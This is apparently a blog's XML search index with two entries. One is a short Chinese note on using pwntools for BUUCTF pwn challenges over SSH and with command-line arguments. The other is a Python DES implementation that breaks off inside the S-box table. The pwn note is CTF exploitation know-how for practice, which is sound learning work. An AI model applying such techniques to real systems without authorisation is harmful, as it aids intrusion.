<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[SSH-PWN的起手式]]></title>
      <url>/2020/03/30/ssh-pwn-de-qi-shou-shi/</url>
      <content type="html"><![CDATA[<html><head></head><body><p>最近在刷BUUCTF的时候遇到了好多之前没使用过的东西 例如什么roptuil和SSH-pwn 还有什么需要在参数部分打上Payload的pwn啊…之类的 之前没学过 在这里记录一下</p>
<h2 id="使用PWNTOOLS来进行SSH连接的PWN"><a href="#使用PWNTOOLS来进行SSH连接的PWN" class="headerlink" title="使用PWNTOOLS来进行SSH连接的PWN"></a>使用PWNTOOLS来进行SSH连接的PWN</h2><p>首先pwntools自己就支持使用ssh的方式来进行连接 连接方式为<br><code>shell=ssh(host='xxx.xxx.xxx.xxx',user='xxx',password='xxxxx',port='xxxx')</code><br>此时直接进行打开交互的话是可以如同正常ssh软件 例如XShell一样是可以操控的 如果我们需要打开PWN题的话就需要使用ssh对象<code>shell</code>来开启一个本地进程 使用<br><code>sh=shell.process("./xxxx")</code><br>来开启一个本地进程进行PWN 剩下的就和正常pwn一样了 填入payload即可 </p>
<h2 id="使用PWNTOOLS来进行输入参数的PWN"><a href="#使用PWNTOOLS来进行输入参数的PWN" class="headerlink" title="使用PWNTOOLS来进行输入参数的PWN"></a>使用PWNTOOLS来进行输入参数的PWN</h2><p>这个也是我翻了翻文档才发现 之前例如什么<code>sh=process("./pwn")</code> 其实process()函数还有一个其他的参数 完整体的process()函数是这样的<br><code>sh=process(argv=['程序路径','参数'])</code><br>这样的话就可以实现带参的PWN了</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></body></html>]]></content>
      
        <categories>
            
            <category> PWN </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[DES加密算法]]></title>
      <url>/2020/03/11/des-jia-mi-suan-fa/</url>
      <content type="html"><![CDATA[<html><head></head><body><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding:utf-8</span>
<span class="token keyword">import</span> re

<span class="token comment" spellcheck="true"># 字符转二进制</span>
<span class="token keyword">def</span> <span class="token function">str2bin</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res<span class="token operator">=</span><span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> string<span class="token punctuation">:</span>
        tmp<span class="token operator">=</span>bin<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token operator">-</span>len<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            tmp<span class="token operator">=</span><span class="token string">'0'</span><span class="token operator">+</span>tmp
        res<span class="token operator">+=</span>tmp
    <span class="token keyword">return</span> res

<span class="token comment" spellcheck="true"># 二进制转字符</span>
<span class="token keyword">def</span> <span class="token function">bin2str</span><span class="token punctuation">(</span>bin_string<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res<span class="token operator">=</span><span class="token string">""</span>
    tmp<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">".{8}"</span><span class="token punctuation">,</span>bin_string<span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> tmp<span class="token punctuation">:</span>
        res<span class="token operator">+=</span>chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> res    

<span class="token comment" spellcheck="true"># IP置换矩阵</span>
IP_Table<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">58</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>
        <span class="token number">60</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>
        <span class="token number">62</span><span class="token punctuation">,</span><span class="token number">54</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span>
        <span class="token number">64</span><span class="token punctuation">,</span><span class="token number">56</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span>
        <span class="token number">57</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>
        <span class="token number">59</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span>
        <span class="token number">61</span><span class="token punctuation">,</span><span class="token number">53</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span>
        <span class="token number">63</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span>

<span class="token comment" spellcheck="true"># IP置换</span>
<span class="token keyword">def</span> <span class="token function">ip_change</span><span class="token punctuation">(</span>bin_string<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res<span class="token operator">=</span><span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> IP_Table<span class="token punctuation">:</span>
        res<span class="token operator">+=</span>bin_string<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> res

<span class="token comment" spellcheck="true"># # IP逆置换矩阵</span>
Re_IP_Table<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">56</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span>
            <span class="token number">39</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span>
            <span class="token number">38</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">54</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">62</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span>
            <span class="token number">37</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">53</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">61</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span>
            <span class="token number">36</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span>
            <span class="token number">35</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">,</span>
            <span class="token number">34</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">58</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">,</span>
            <span class="token number">33</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">57</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">re_ip_change</span><span class="token punctuation">(</span>bin_str<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true"># print(bin_str)</span>
    res <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> Re_IP_Table<span class="token punctuation">:</span>
        res <span class="token operator">+=</span> bin_str<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span>
        <span class="token comment" spellcheck="true"># str='num:'.str(i-1).bin_str[i-1]</span>
        <span class="token comment" spellcheck="true"># print(bin_str[i-1])</span>
    <span class="token comment" spellcheck="true"># print(res)</span>
    <span class="token keyword">return</span> res

<span class="token comment" spellcheck="true"># PC-1置换表</span>
PC_1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">57</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span>
    <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">58</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span>
    <span class="token number">10</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">,</span>
    <span class="token number">19</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span>
    <span class="token number">63</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span>
    <span class="token number">7</span><span class="token punctuation">,</span><span class="token number">62</span><span class="token punctuation">,</span><span class="token number">54</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span>
    <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">61</span><span class="token punctuation">,</span><span class="token number">53</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span>
    <span class="token number">21</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span>


<span class="token comment" spellcheck="true"># PC-1置换</span>
<span class="token keyword">def</span> <span class="token function">PC1_change</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res<span class="token operator">=</span><span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> PC_1<span class="token punctuation">:</span>
        res<span class="token operator">+=</span>key<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> res

<span class="token comment" spellcheck="true"># PC-2置换表</span>
PC_2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span>
      <span class="token number">15</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>
      <span class="token number">26</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>
      <span class="token number">41</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span>
      <span class="token number">51</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">56</span><span class="token punctuation">,</span>
      <span class="token number">34</span><span class="token punctuation">,</span><span class="token number">53</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">]</span>

<span class="token comment" spellcheck="true"># PC-2置换</span>
<span class="token keyword">def</span> <span class="token function">PC2_change</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res<span class="token operator">=</span><span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> PC_2<span class="token punctuation">:</span>
        res<span class="token operator">+=</span>key<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> res

<span class="token comment" spellcheck="true"># 每轮子秘钥左移位数</span>
shift<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span>

<span class="token comment" spellcheck="true"># 秘钥左移</span>
<span class="token keyword">def</span> <span class="token function">left_shift</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res<span class="token operator">=</span>key<span class="token punctuation">[</span>num<span class="token punctuation">:</span>len<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span>
    res<span class="token operator">=</span>res<span class="token operator">+</span>key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>num<span class="token punctuation">]</span>
    <span class="token keyword">return</span> res


<span class="token comment" spellcheck="true"># 生成16组子秘钥</span>
<span class="token keyword">def</span> <span class="token function">get_key</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    key_list<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token comment" spellcheck="true"># print(key)</span>
    key<span class="token operator">=</span>PC1_change<span class="token punctuation">(</span>key<span class="token punctuation">)</span>

    key_c0<span class="token operator">=</span>key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">28</span><span class="token punctuation">]</span>
    key_d0<span class="token operator">=</span>key<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> shift<span class="token punctuation">:</span>
        key_c<span class="token operator">=</span>left_shift<span class="token punctuation">(</span>key_c0<span class="token punctuation">,</span>i<span class="token punctuation">)</span>
        key_d<span class="token operator">=</span>left_shift<span class="token punctuation">(</span>key_d0<span class="token punctuation">,</span>i<span class="token punctuation">)</span>
        key_out<span class="token operator">=</span>PC2_change<span class="token punctuation">(</span>key_c<span class="token operator">+</span>key_d<span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># key_c0=key_c # 暂定为迭代计算</span>
        <span class="token comment" spellcheck="true"># key_d0=key_d</span>
        key_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>key_out<span class="token punctuation">)</span>
    <span class="token keyword">return</span> key_list

<span class="token comment" spellcheck="true"># E扩展置换表</span>
E<span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span>
    <span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span>
    <span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span>
    <span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span>
    <span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">,</span>
    <span class="token number">28</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span>

<span class="token comment" spellcheck="true"># E扩展置换</span>
<span class="token keyword">def</span> <span class="token function">e_change</span><span class="token punctuation">(</span>bin_string<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res<span class="token operator">=</span><span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> E<span class="token punctuation">:</span>
        res<span class="token operator">+=</span>bin_string<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> res

<span class="token comment" spellcheck="true"># 字符异或</span>
<span class="token keyword">def</span> <span class="token function">str_xor</span><span class="token punctuation">(</span>string1<span class="token punctuation">,</span>string2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res<span class="token operator">=</span><span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>string1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        tmp_res<span class="token operator">=</span>int<span class="token punctuation">(</span>string1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token operator">^</span>int<span class="token punctuation">(</span>string2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> tmp_res<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>
           res<span class="token operator">+=</span><span class="token string">'1'</span>
        <span class="token keyword">if</span> tmp_res<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>
            res<span class="token operator">+=</span><span class="token string">'0'</span>
    <span class="token keyword">return</span> res 

<span class="token comment" spellcheck="true"># S盒</span>
S<span class="token operator">=</span><span class="token punctuation">[</span>
<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span>
<span class="token number">0</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span>
<span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>
<span class="token number">15</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">,</span>

<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span>
<span class="token number">3</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span>
